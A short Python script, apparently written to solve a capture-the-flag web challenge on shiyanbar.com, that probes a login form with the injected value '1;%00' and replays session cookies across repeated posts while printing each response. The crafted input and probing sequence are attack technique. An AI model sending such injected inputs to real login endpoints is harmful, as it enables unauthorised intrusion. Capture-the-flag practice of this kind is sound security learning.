#coding=utf-8
'''
    :author mrli
    :date  
    :funcname
'''
import requests
sess = requests.session()
url = 'http://ctf5.shiyanbar.com/web/jiandan/index.php'
response = sess.get(url)
print (response)
headers = sess.headers
cookies = sess.cookies

print (headers)
print (cookies)


data = {
    'id':'1;%00','submit':'Login'
}

response = sess.post(url,data=data,headers=headers,cookies=cookies)
print (response)
print (response.content)

headers = sess.headers
cookies = sess.cookies
print (headers)
print (cookies)
data = {
    'submit':'Login'
}
response = sess.post(url, data=data,headers=headers,cookies=cookies)
print (response)
print (response.content)

headers = response.headers
cookies = response.cookies
print (headers)
print (cookies)

data = {
     'submit':'Login'
}
response = sess.post(url, data=data,headers=headers,cookies=cookies)
print (response)
print (response.content)

headers = response.headers
cookies = response.cookies
print (headers)
print (cookies)


if __name__ == '__main__':
    pass